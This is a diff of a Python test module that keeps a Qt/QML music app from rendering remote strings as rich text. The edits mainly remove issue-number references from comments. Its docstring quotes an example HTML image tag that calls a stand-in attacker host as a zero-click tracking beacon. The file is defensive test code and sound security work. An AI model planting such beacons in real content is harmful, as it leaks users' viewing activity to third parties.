@@ -1,7 +1,7 @@
-"""Regression guard: a zero-click image-beacon must never re-appear in the QML.
+"""A zero-click image-beacon must never re-appear in the QML.
 
-THE BUG WE ARE FENCING OFF
---------------------------
+WHAT THIS FENCES OFF
+--------------------
 Qt's ``Text``/``Label`` default to ``textFormat: Text.AutoText``. AutoText sniffs
 the bound string and, if it looks like HTML, parses it as *rich text*, at which
 point an embedded ``<img src="https://attacker/beacon?id=...">`` is fetched the
@@ -13,9 +13,9 @@ is a zero-click outbound beacon leaking "this user viewed this item".
 
 HOW THIS STAYS FIXED
 --------------------
-A denylist of "which bindings are remote" is fragile; an adversarial review showed
-it leaks via bare component props, bracket access (``model['x']``), local aliases,
-and ``RichText``. So the guard is STRUCTURAL, with ZERO false negatives by design:
+A denylist of "which bindings are remote" is fragile: it leaks via bare
+component props, bracket access (``model['x']``), local aliases, and
+``RichText``. So the guard is STRUCTURAL, with ZERO false negatives by design:
 
 * ``test_dynamic_text_is_plaintext``: in Main.qml (the TIDAL render surface) EVERY
   ``Text``/``Label`` whose ``text:`` is a *dynamic* (non-literal) expression must be
@@ -26,7 +26,7 @@ and ``RichText``. So the guard is STRUCTURAL, with ZERO false negatives by desig
   must equal exactly the audited ``DELIBERATE_RICHTEXT`` spots (all bind LOCAL data),
   closing the other two rich-text paths.
 * ``RemoteText.qml`` is the ergonomic shared default for new remote strings; its own
-  test pins ``PlainText``. The ``REMOTE_MARKERS`` below are now used only to flag a
+  test pins ``PlainText``. The ``REMOTE_MARKERS`` below are used only to flag a
   deliberate rich-text spot that *starts* binding remote data.
 
 See ``ALGORITHM`` below for the exact detection rules.
@@ -45,22 +45,22 @@ from support.paths import QML_DIR
 #   Main.qml         renders TIDAL search/library/queue/artist results, so its
 #                    `model.`/`modelData.`/`artistData.`/`db.label` bindings are
 #                    attacker-controllable → remote.
-#   DownloadButton.qml  the download control and its Chooser (split out of
-#                    Main.qml, #315 slice 2): `db.label` carries a remote artist
+#   DownloadButton.qml  the download control and its Chooser:
+#                    `db.label` carries a remote artist
 #                    name and the provider tiles carry bridge descriptor names.
-#   Art.qml          the VideoCell closure (split out of Main.qml, #315 slice 3):
+#   Art.qml          the VideoCell closure:
 #   PlayBadge.qml    Art renders every cover (titles/names ride its callers),
 #   BigVideoThumb.qml  BigVideoThumb/VideoCell render a video result's title,
 #   VideoCell.qml    artist, date and spec, ArtistLinks renders remote artist
 #   ArtistLinks.qml  names (and marks them), so all six ride the TIDAL set even
 #   ExplicitMark.qml where the element is local chrome today.
-#   BackToTop.qml    components split out of Main.qml (#315). They render local
+#   BackToTop.qml    local-chrome components. They render local
 #   DotMatrix.qml    chrome only, so no remote marker matches today; they ride
 #   SnakeField.qml   the TIDAL set anyway so the STRUCTURAL PlainText rule
 #   HoverSwell.qml   (`test_dynamic_text_is_plaintext`) scans their Text elements,
 #   QueueStack.qml   and a future binding there cannot go unchecked.
 #   RetryMark.qml
-#   QueueDrawer.qml  the drawer closure split out of Main.qml (#315 slice 4):
+#   QueueDrawer.qml  the drawer closure:
 #   LogsDrawer.qml   the queue rows render TIDAL titles/artists/status words,
 #   QualTag.qml      QualTag renders the catalog's tier words, DecryptText's
 #   DecryptText.qml  target is the ledger's status cell, and LogsDrawer/SpecBtn
@@ -72,7 +72,7 @@ from support.paths import QML_DIR
 #                    So `model.`/`modelData.` there are NOT remote. It is still
 #                    scanned so its deliberate StyledText spots stay deliberate and
 #                    can't quietly start binding a TIDAL string.
-#   TrackRow.qml     the TrackRow cluster split out of Main.qml (#315 slice 5):
+#   TrackRow.qml     the TrackRow cluster:
 #   PreviewArt.qml   TrackRow renders search/artist/library rows (remote titles,
 #   QualPick.qml     artists, albums), PreviewArt renders a track's cover and the
 #   QualPickRow.qml  player's words, QualPick/QualPickRow render the catalog's
@@ -82,8 +82,8 @@ from support.paths import QML_DIR
 #   TrackPresencePill.qml  the earlier split files: the PlainText rule scans
 #   StandalonePair.qml     every Text element they hold.
 #   ProviderBadge.qml
-#   AlbumBlock.qml   the LibSourceGroup closure split out of Main.qml (#315
-#   AlbumPresencePill.qml  slice 5): AlbumBlock/TrackPreview render TIDAL
+#   AlbumBlock.qml   the LibSourceGroup closure:
+#   AlbumPresencePill.qml  AlbumBlock/TrackPreview render TIDAL
 #   ArtCard.qml      albums and tracks, ArtCard/LibPlaylistRow/ArtistBadges/
 #   ArtistBadges.qml CardCaption render catalog titles, artists, dates and
 #   CardCaption.qml  playlist names, LibSourceGroup renders the saved-shelf
@@ -103,26 +103,26 @@ from support.paths import QML_DIR
 #   ShelfWheelRedirect.qml
 #   TrackPreview.qml
 #   VideoThumb.qml
-#   SectionHeader.qml  the SearchProviderGroup closure split out of Main.qml
-#   ShowAllLabel.qml   (#315 slice 6): SearchProviderGroup renders the provider
+#   SectionHeader.qml  the SearchProviderGroup closure:
+#   ShowAllLabel.qml   SearchProviderGroup renders the provider
 #   SearchSectionMore.qml  heads and every search section (remote names and
 #   SearchProviderGroup.qml  titles), PlaylistBlock and ArtistSearchCard render
 #   PlaylistBlock.qml  remote playlist/artist rows, and the rest (SectionHeader,
 #   ArtistSearchCard.qml  ShowAllLabel, SearchSectionMore) are local chrome that
 #                      ride the set for the same structural reason.
-#   BrowseSection.qml  the browse closure split out of Main.qml (#315 slice 7):
+#   BrowseSection.qml  the browse closure:
 #   BrowseCard.qml     BrowseSection/BrowseCard/BrowseTile render remote section
 #   BrowseTile.qml     titles, album/track names and genre labels; MosaicCell
 #   MosaicCell.qml     holds no Text of its own but rides the set for the same
 #                      structural reason as the other split files.
-#   WelcomePicker.qml  the welcome closure split out of Main.qml (#315 slice 8):
+#   WelcomePicker.qml  the welcome closure:
 #   WelcomeBanner.qml  WelcomePicker renders provider names/status words and the
 #   PasteGlyph.qml     inline sign-in steps, WelcomeBanner renders the app's own
 #   GateAction.qml     welcome chrome, and the rest (PasteGlyph, GateAction,
 #   DecodeController.qml  DecodeController) are local chrome that ride the set
 #                      for the same structural reason.
-#   WaveMark.qml       the last inline components split out of Main.qml (#315
-#   GateCard.qml       slice 9): LibLibrarySection renders the scanned library
+#   WaveMark.qml       the last inline components:
+#   GateCard.qml       LibLibrarySection renders the scanned library
 #   NavTab.qml         (its rows carry file names and provider labels); the
 #   NavCrumbTrail.qml  rest (WaveMark, GateCard, NavTab, NavCrumbTrail,
 #   BrowseScroll.qml   BrowseScroll) are local chrome that ride the set for the
@@ -576,17 +576,17 @@ def _is_literal_only(text_value: str) -> bool:
 # A component DERIVED from Text (`component DecryptText: Text { … }`) matches
 # the element scanner only at its own definition; its instances are named
 # something the Text|Label regex has never heard of, so they matched neither the
-# structural test nor the StyledText/RichText backstop. Today all of them assign
-# their text imperatively from local literals, so nothing beacons, but the guard
-# was fail-OPEN there: binding remote data through one, or adding a new
-# `component FooText: Text`, would have sailed past CI. Derived components are
-# now held to exactly what RemoteText is held to, and found by pattern rather
-# than by name, so the next one is covered the day it is written. #315 later
-# moved DecryptText into its own file; a file whose root element is the Text
-# is the same component in a different shape, and both are matched below.
+# structural test nor the StyledText/RichText backstop. Assigning their text
+# imperatively from local literals keeps them from beaconing, but the guard is
+# fail-OPEN there: binding remote data through one, or adding a new
+# `component FooText: Text`, sails past CI. Derived components are held to
+# exactly what RemoteText is held to, and found by pattern rather than by
+# name, so the next one is covered the day it is written. A component
+# whose root element is the Text is the same component in a different shape,
+# and both are matched below.
 _DERIVED_TEXT_COMPONENT = re.compile(r"(?m)^\s*component\s+([A-Za-z_][A-Za-z0-9_]*)\s*:\s*(?:Text|Label)\s*\{")
 
-# A Text/Label component that moved into its own file (#315) has no
+# A Text/Label component in its own file has no
 # `component X: Text` line left to match: its ROOT element is the Text, and
 # the file's stem is the component name. Same pin, same instance scan below.
 _ROOT_TEXT_COMPONENT = re.compile(r"(?m)^(Text|Label)\s*\{")
@@ -689,9 +689,8 @@ def test_remotetext_instances_do_not_reenable_richtext():
 
 
 def test_dynamic_text_is_plaintext():
-    """STRUCTURAL guard (the real anti-regression rule). In Main.qml and the
-    components split out of it (#315) EVERY
-    Text/Label whose ``text:`` is a dynamic
+    """STRUCTURAL guard (the real anti-regression rule). In Main.qml and every
+    component file, EVERY Text/Label whose ``text:`` is a dynamic
     (non-literal) expression must render as PlainText, be a RemoteText, or be one of
     the audited intentional-StyledText spots. No remote-vs-local guessing: any
     dynamic string, however it reaches ``text:`` (``model.x``, a bare component prop
